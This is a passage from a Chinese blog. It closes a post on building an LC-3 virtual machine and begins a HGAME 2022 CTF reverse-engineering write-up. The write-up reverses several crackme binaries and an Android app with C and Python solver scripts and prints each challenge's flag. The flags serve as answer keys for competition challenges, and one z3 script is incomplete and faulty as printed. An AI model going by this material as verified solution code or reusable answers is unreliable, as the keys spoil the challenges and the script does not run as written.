class="line"></span><br><span class="line">HANDLE hStdin = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UINT16_MAX 65536</span></span><br></pre></td></tr></table></figure>

<p>加入API：</p>
<p><strong>代码7-2</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DWORD fdwMode, fdwOldMode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disable_input_buffering</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hStdin = GetStdHandle(STD_INPUT_HANDLE);</span><br><span class="line">    GetConsoleMode(hStdin, &amp;fdwOldMode); <span class="comment">/* save old mode */</span></span><br><span class="line">    fdwMode = fdwOldMode</span><br><span class="line">            ^ ENABLE_ECHO_INPUT  <span class="comment">/* no input echo */</span></span><br><span class="line">            ^ ENABLE_LINE_INPUT; <span class="comment">/* return when one or</span></span><br><span class="line"><span class="comment">                                    more characters are available */</span></span><br><span class="line">    SetConsoleMode(hStdin, fdwMode); <span class="comment">/* set new mode */</span></span><br><span class="line">    FlushConsoleInputBuffer(hStdin); <span class="comment">/* clear buffer */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">restore_input_buffering</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SetConsoleMode(hStdin, fdwOldMode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_interrupt</span><span class="params">(<span class="keyword">int</span> signal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    restore_input_buffering();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码7-3</strong>：初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signal(SIGINT, handle_interrupt);</span><br><span class="line">disable_input_buffering();</span><br></pre></td></tr></table></figure>

<p><strong>代码7-4</strong>：释放</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">restore_input_buffering();</span><br></pre></td></tr></table></figure>

<p>之后按顺序组装：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span><span class="number">-1</span></span><br><span class="line"><span class="number">3</span><span class="number">-1</span></span><br><span class="line"><span class="number">4</span><span class="number">-1</span></span><br><span class="line"><span class="number">3</span><span class="number">-3</span></span><br><span class="line"><span class="number">2</span><span class="number">-1</span></span><br><span class="line"><span class="number">6</span><span class="number">-14</span></span><br><span class="line"><span class="number">1</span><span class="number">-1</span></span><br><span class="line"><span class="number">3</span><span class="number">-2</span></span><br><span class="line"><span class="number">4</span><span class="number">-2</span></span><br><span class="line"><span class="number">1</span><span class="number">-4</span></span><br><span class="line"><span class="number">1</span><span class="number">-3</span></span><br><span class="line"><span class="number">2</span><span class="number">-2</span></span><br><span class="line"><span class="number">7</span><span class="number">-2</span></span><br><span class="line">    </span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>之后就可以得到一台16位的虚拟机；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>过了一遍VM实验过后对虚拟机有了一定理解，并且对之前所见的VM逆向题有了解题的思路，以及了解了LC-3指令集，和些许API函数的作用，由此更加理解一个源代码如何与其他文件产生共鸣；可以类比shell与程序之间的关系，更好地理解shell的作用和本质；</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/02/6a5abff6032048e5.png" alt="genshin"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/02/24/VM%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/" data-id="cl0145pxj0000zovccvyo5o4l" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Hgame2022-ReverseWriteUp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/02/22/Hgame2022-ReverseWriteUp/" class="article-date">
  <time datetime="2022-02-22T12:51:59.000Z" itemprop="datePublished">2022-02-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/02/22/Hgame2022-ReverseWriteUp/">Hgame2022-ReverseWriteUp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这是2022年HGAME比赛的REVERSE复现，其中有思路借鉴于官方答案；</p>
<h2 id="Week1："><a href="#Week1：" class="headerlink" title="Week1："></a>Week1：</h2><h2 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/b4d2fa2e7da244d7.png" alt="main"></p>
<p>可以在主要部分找到一个循环运算，而这里的 [si] 的间接地址就代表了输入flag的位置，es是保存了seg001数组的寄存器，这个循环的意思就是：循环28次，每次交换输入字符的前4位和后4位，最后异或23得到seg001的值；</p>
<p>按照这个思路反向运算写出的C语言：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> out[<span class="number">28</span>] = &#123;</span><br><span class="line">    <span class="number">0x91</span>, <span class="number">0x61</span>, <span class="number">0x01</span>, <span class="number">0xC1</span>, <span class="number">0x41</span>, <span class="number">0xA0</span>, <span class="number">0x60</span>, <span class="number">0x41</span>, <span class="number">0xD1</span>, <span class="number">0x21</span>, <span class="number">0x14</span>, <span class="number">0xC1</span>, <span class="number">0x41</span>, <span class="number">0xE2</span>, <span class="number">0x50</span>, <span class="number">0xE1</span>, </span><br><span class="line">    <span class="number">0xE2</span>, <span class="number">0x54</span>, <span class="number">0x20</span>, <span class="number">0xC1</span>, <span class="number">0xE2</span>, <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x30</span>, <span class="number">0xD1</span>, <span class="number">0x51</span>, <span class="number">0xC0</span>, <span class="number">0x17</span></span><br><span class="line">	&#125;; <span class="comment">//seg001数组</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> in[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> a,b;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> an[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">28</span>;i++)	<span class="comment">//运算</span></span><br><span class="line">	&#123;</span><br><span class="line">		out[i] = out[i] ^ <span class="number">23</span>;</span><br><span class="line">		a = out[i] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">		b = out[i] &amp; <span class="number">0xF</span>;</span><br><span class="line">		b = b &lt;&lt; <span class="number">4</span>;</span><br><span class="line">		in[i] = a + b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">28</span>;i++)	<span class="comment">//换ASCII</span></span><br><span class="line">	&#123;</span><br><span class="line">		an[i] = in[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,an);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：hgame{welc0me_to_4sm_w0rld}</strong></p>
<h2 id="creakme"><a href="#creakme" class="headerlink" title="creakme"></a>creakme</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/ca4bb3ade31c69f7.png" alt="main"></p>
<p>一来可以发现一个类似于base64的码表，但再看算法，发现并不是base64；</p>
<p>经过这个for运算后，会让运算后的值与v11进行比较；</p>
<p>所以解题思路就是去逆向这个for循环，但写出解题代码后发现并不正确；</p>
<p>最有意思的原因是仔细看v10，它的定义是_DWORD，也就是32位，运算中出现的v3也是32位；</p>
<p>所以让所有运算的数据成为32位的，再写代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> Table[<span class="number">17</span>] = &#123;</span><br><span class="line">    <span class="number">0x44434241</span>, <span class="number">0x48474645</span>, <span class="number">0x4C4B4A49</span>, <span class="number">0x504F4E4D</span>, <span class="number">0x54535251</span>, <span class="number">0x58575655</span>, <span class="number">0x62615A59</span>, <span class="number">0x66656463</span>, </span><br><span class="line">    <span class="number">0x6A696867</span>, <span class="number">0x6E6D6C6B</span>, <span class="number">0x7271706F</span>, <span class="number">0x76757473</span>, <span class="number">0x7A797877</span>, <span class="number">0x33323130</span>, <span class="number">0x37363534</span>, <span class="number">0x2F2B3938</span>, </span><br><span class="line">    <span class="number">0x0000003D</span> <span class="comment">//v10</span></span><br><span class="line">	&#125;;	</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> out[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x48D93488</span>, <span class="number">0x030C144C</span>, <span class="number">0x52EB78C2</span>, <span class="number">0xED9CE5ED</span>, <span class="number">0xAE1FEDE6</span>, <span class="number">0xBA5A126D</span>, <span class="number">0xCF9284AA</span>, <span class="number">0x65E0F2E3</span>		&#125;; <span class="comment">//v11</span></span><br><span class="line">	<span class="keyword">int</span> i,c,j;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> a,b;</span><br><span class="line">	</span><br><span class="line">	i = <span class="number">0</span>, c = <span class="number">0x12345678</span> * <span class="number">33</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i+=<span class="number">2</span>) <span class="comment">//运算</span></span><br><span class="line">	&#123;</span><br><span class="line">		a = out[i];</span><br><span class="line">		b = out[i+<span class="number">1</span>];</span><br><span class="line">		j = <span class="number">32</span>;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			c -= <span class="number">0x12345678</span>;</span><br><span class="line">			b -= c ^ (c + a) ^ (Table[<span class="number">0</span>] + <span class="number">16</span> * a) ^ (Table[<span class="number">1</span>] + (a &gt;&gt; <span class="number">5</span>));</span><br><span class="line">			a -= c ^ (c + b) ^ (Table[<span class="number">2</span>] + <span class="number">16</span> * b) ^ (Table[<span class="number">3</span>] + (b &gt;&gt; <span class="number">5</span>));</span><br><span class="line">			--j;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(j);</span><br><span class="line">		c = <span class="number">0x12345678</span> * <span class="number">33</span>;</span><br><span class="line">		out[i] = a;</span><br><span class="line">		out[i+<span class="number">1</span>] = b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++) <span class="comment">//输出hex</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>,out[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出后的hex转换为ascii后发现也不对，但很明显这就是flag的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HEX <span class="number">6</span>D616768 <span class="number">34487B</span>65 <span class="number">5F</span>797070 <span class="number">34633476</span> <span class="number">6E306974</span> <span class="number">7</span>D21 <span class="number">0</span> <span class="number">0</span></span><br><span class="line">flag <span class="string">&#x27;magh4H&#123;e_ypp4c4vn0it&#125;!&#x27;</span></span><br></pre></td></tr></table></figure>

<p>之后发现原因是小端序排列的原因；</p>
<p><strong>调整下顺序便可以得到flag：hgame{H4ppy_v4c4ti0n!}</strong></p>
<h2 id="Flag-Checker"><a href="#Flag-Checker" class="headerlink" title="Flag Checker"></a>Flag Checker</h2><p>这是个安卓apk，用jeb分析：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/f7d9327c457eee0f.png" alt="RC4"></p>
<p>点进flag checker的MainActivity里，会发现有一个encrypt方法，使用了标准RC4加密；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/d5305c18802d1f17.png" alt="main"></p>
<p>之后出现了主函数，使用 ‘carol’ 做密钥来RC4加密，之后可以看到Base64的字样，那么说明使用了base64加密；</p>
<p>最后用两次加密的结果与 mg6CI 开头的那个字符串比较相同与否；</p>
<p>那么就可以反着逆，先解base64，再解RC4：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">Sbox = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init</span>(<span class="params">s, key, <span class="built_in">len</span></span>):</span> </span><br><span class="line">    k = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        key[i] = <span class="built_in">ord</span>(key[i])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        s[i] = i</span><br><span class="line">        k[i] = key[i%<span class="built_in">len</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j+s[i]+k[i])%<span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_crypt</span>(<span class="params">s, data, <span class="built_in">len</span></span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        i = (i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">        j = (j+s[i])%<span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        t = (s[i]+s[j])%<span class="number">256</span></span><br><span class="line">        data[k] = data[k] ^ s[t]</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#x27;</span></span><br><span class="line">out = base64.b64decode(out)</span><br><span class="line">out = <span class="built_in">list</span>(out)</span><br><span class="line">key = <span class="string">&#x27;carol&#x27;</span></span><br><span class="line">key = <span class="built_in">list</span>(key)</span><br><span class="line">rc4_init(Sbox,key,<span class="built_in">len</span>(key))</span><br><span class="line">rc4_crypt(Sbox,out,<span class="built_in">len</span>(out))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(out)):</span><br><span class="line">    out[i] = <span class="built_in">chr</span>(out[i])</span><br><span class="line">out = <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D}</strong></p>
<h2 id="猫头鹰是不是猫"><a href="#猫头鹰是不是猫" class="headerlink" title="猫头鹰是不是猫"></a>猫头鹰是不是猫</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/80bf563d3c6158da.png" alt="function"></p>
<p>最左边是main函数，右上是sub_55B565CA524E，右下是crypto；</p>
<p>一上来就会运行两次右上的函数，效果是用0，和1打印出猫和猫头鹰的样子（解题没什么用）；</p>
<p>之后会让输入长度为64的字符串，将字符串经过crypto函数过后加密，加密后与cmp数组比较与否；</p>
<p>这里可以说明一下：cat，owl都是16384字节的数组，也就是4096 * 4；cmp是256字节的数组，也就是64 *4；</p>
<p>重点在于crypto函数，先后两次用sub_55B565CA5347函数与cat和owl两个数组参数将output变量加密；</p>
<p>进入sub_55B565CA5347函数：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/b5e24a8342d75f0c.png" alt="sub_55B565CA5347"></p>
<p>首先是经过第一个嵌套循环将输入的cat或者owl数组的每个数据都除10；</p>
<p>之后经过第二个嵌套函数将64个输入的字符，分别每个字符与对应的cat或者owl数相乘，再把64次运算的结果加在一起；</p>
<p>这样的一次总和，就成为了新的output数组里的一个字符；而注意这个函数将运算结果ans换到output里的时候，output数组下标有个4*n，这说明output最后的结果是DWORD类型的，也就是单个数据32位，一共64个数据；这也和256个字节（也就是256 * 8 = 2048 = 32 * 64（单位是位））的cmp比较数组对的上号；</p>
<p>所以让cmp数组变为DWORD型数据，先经过owl输入的运算，再经过cat输入的运算，最后得到输入的64个字符；</p>
<p>这样一看，就会发现：当cmp成为已知实数的时候，在owl输入的运算中，有64个未知数（正着运算前的output），和64组方程（64个未知数分别加上指定常数的和，一共64个）；这是一个线性代数，且有唯一解；同理，在cat输入的运算中也是这样；</p>
<p>那么思路就是解两次线性代数，写代码的时候采用z3库解方程；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cat = [] <span class="comment">#cat和owl的数据过于庞大，就不显示出来了，都是DWORD型的，每个数字32位；</span></span><br><span class="line">owl = []</span><br><span class="line">data = [] <span class="comment">#这是cmp已知数据；</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):                         <span class="comment">#owl和cat每个数除10；</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        cat[(<span class="number">64</span>*i+j)] = cat[(<span class="number">64</span>*i+j)] / <span class="number">10</span>    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        owl[(<span class="number">64</span>*i+j)] = owl[(<span class="number">64</span>*i+j)] / <span class="number">10</span></span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">so = Solver()</span><br><span class="line">out = [Int(<span class="string">&#x27;out[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)] <span class="comment">#z3设置未知数；</span></span><br><span class="line">o = [Int(<span class="string">&#x27;o[%d]&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):                           <span class="comment">#解第一组owl的输入方程，有解就会输出64个解；</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="built_in">sum</span> + out[j] * owl[(<span class="number">64</span>*j+i)]</span><br><span class="line">    s.add(data[i] == <span class="built_in">sum</span>)</span><br><span class="line"><span class="keyword">if</span>(s.check()==sat):</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br><span class="line">out = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line">out = [] <span class="comment">#输出后的数据再写入，进行第二轮运算；</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):	                          <span class="comment">#解第二组cat的输入方程，有解就会输出64个解；</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="built_in">sum</span> + o[j] * cat[(<span class="number">64</span>*j+i)]</span><br><span class="line">    so.add(out[i] == <span class="built_in">sum</span>)</span><br><span class="line"><span class="keyword">if</span>(so.check()==sat):</span><br><span class="line">	<span class="built_in">int</span>(so.model())</span><br><span class="line"></span><br><span class="line">o = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line">o = [] <span class="comment">#输出后的数据再写入，方便直接显示flag；</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):       <span class="comment">#将运算后的数据换成ascii码输出最后的字符串；</span></span><br><span class="line">    o[i] = <span class="built_in">chr</span>(o[i])</span><br><span class="line">o = <span class="string">&#x27;&#x27;</span>.join(o)</span><br><span class="line"><span class="built_in">print</span>(o)</span><br></pre></td></tr></table></figure>

<p><strong>多次运行补充数据后得到flag：hgame{100011100000110000100000000110001010110000100010011001111}</strong></p>
<h2 id="Week2："><a href="#Week2：" class="headerlink" title="Week2："></a>Week2：</h2><h2 id="xD-MAZE"><a href="#xD-MAZE" class="headerlink" title="xD MAZE"></a>xD MAZE</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/c1cdf4b151cd5d7f.png" alt="main"></p>
<p>一进主函数就能看见关键词的拼接：hgame{ + x + } ；可以通过v3，v4的赋值以及下面的 if 判断推测出x的长度是28；</p>
<p>右图是28个长度的v11循环运算，正好对应了 cin 输入的v11；有四个数字，对应四个方向，不同的方向会导致 j 的不同增长；</p>
<p>左下图是有个maze数组的判断； 如果不是空格（32），或者 j 超出了maze范围，就会失败，否则就成功；这个数组是由4096个 空格 和 # 符号组成；可以把空格想象成可以走的路，而 # 符号是围墙，通过 j 变量来操控人物走迷宫；</p>
<p>那可以写一个简单的迷宫算法，模拟 j 变量走通迷宫，并记录 j 变量如何增长，对应的 v11 输入是怎么样的情况；</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">maze = [] <span class="comment">#4096个数据太多，不写出来</span></span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">28</span> <span class="comment">#输入的数据</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">n = [<span class="number">0</span>] * <span class="number">28</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">28</span>): </span><br><span class="line">    <span class="keyword">if</span> ((maze[j+<span class="number">1</span>]==<span class="number">32</span>)&amp;(n[i]!=<span class="number">1</span>)):  <span class="comment">#while是主体算法</span></span><br><span class="line">        flag[i] = <span class="number">3</span>                  <span class="comment">#每次判断四个方向，并用n变量记录这次选的方向</span></span><br><span class="line">        n[i] = <span class="number">1</span>                     <span 